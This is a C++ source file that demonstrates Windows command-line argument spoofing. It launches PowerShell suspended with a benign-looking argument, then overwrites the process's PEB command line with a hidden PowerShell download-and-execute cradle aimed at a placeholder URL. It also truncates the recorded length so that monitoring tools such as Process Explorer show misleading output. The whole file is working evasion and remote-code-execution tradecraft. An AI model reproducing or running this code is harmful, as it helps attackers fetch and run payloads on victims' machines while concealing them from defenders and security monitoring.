#include <iostream>
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS(*NtQueryInformationProcess2)(
	IN HANDLE,
	IN PROCESSINFOCLASS,
	OUT PVOID,
	IN ULONG,
	OUT PULONG
	);

void* readProcessMemory(HANDLE process, void *address, DWORD bytes) {
	SIZE_T bytesRead;
	char *alloc;

	alloc = (char *)malloc(bytes);
	if (alloc == NULL) {
		return NULL;
	}

	if (ReadProcessMemory(process, address, alloc, bytes, &bytesRead) == 0) {
		free(alloc);
		return NULL;
	}

	return alloc;
}

BOOL writeProcessMemory(HANDLE process, void *address, void *data, DWORD bytes) {
	SIZE_T bytesWritten;

	if (WriteProcessMemory(process, address, data, bytes, &bytesWritten) == 0) {
		return false;
	}

	return true;
}

int main(int argc, char **canttrustthis)
{
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	CONTEXT context;
	BOOL success;
	PROCESS_BASIC_INFORMATION pbi;
	DWORD retLen;
	SIZE_T bytesRead;
	PEB pebLocal;
	RTL_USER_PROCESS_PARAMETERS *parameters;

	printf("Argument Spoofing Example by @_xpn_\n\n");

	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));

	// Start process suspended
	success = CreateProcessA(
		NULL,
		(LPSTR)"powershell.exe -NoExit -c Write-Host 'This is just a friendly argument, nothing to see here'",
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
		NULL,
		"C:\\Windows\\System32\\",
		&si,
		&pi);

	if (success == FALSE) {
		printf("[!] Error: Could not call CreateProcess\n");
		return 1;
	}

	// Retrieve information on PEB location in process
	NtQueryInformationProcess2 ntpi = (NtQueryInformationProcess2)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryInformationProcess");
	ntpi(
		pi.hProcess,
		ProcessBasicInformation,
		&pbi,
		sizeof(pbi),
		&retLen
	);

	// Read the PEB from the target process
	success = ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &pebLocal, sizeof(PEB), &bytesRead);
	if (success == FALSE) {
		printf("[!] Error: Could not call ReadProcessMemory to grab PEB\n");
		return 1;
	}

	// Grab the ProcessParameters from PEB
	parameters = (RTL_USER_PROCESS_PARAMETERS*)readProcessMemory(
		pi.hProcess,
		pebLocal.ProcessParameters,
		sizeof(RTL_USER_PROCESS_PARAMETERS) + 300
	);

	// Set the actual arguments we are looking to use
	WCHAR spoofed[] = L"powershell.exe -w hidden $OCTCHAR = (New-Object Net.WebClient).DownloadString('OCT_COMMAND'); Invoke-Expression $OCTCHAR\0";
	success = writeProcessMemory(pi.hProcess, parameters->CommandLine.Buffer, (void*)spoofed, sizeof(spoofed));
	if (success == FALSE) {
		printf("[!] Error: Could not call WriteProcessMemory to update commandline args\n");
		return 1;
	}

	/////// Below we can see an example of truncated output in ProcessHacker and ProcessExplorer /////////

	// Update the CommandLine length (Remember, UNICODE length here)
	DWORD newUnicodeLen = 28;

	success = writeProcessMemory(
		pi.hProcess,
		(char *)pebLocal.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length),
		(void*)&newUnicodeLen,
		4
	);
	if (success == FALSE) {
		printf("[!] Error: Could not call WriteProcessMemory to update commandline arg length\n");
		return 1;
	}

	// Resume thread execution*/
	ResumeThread(pi.hThread);
}
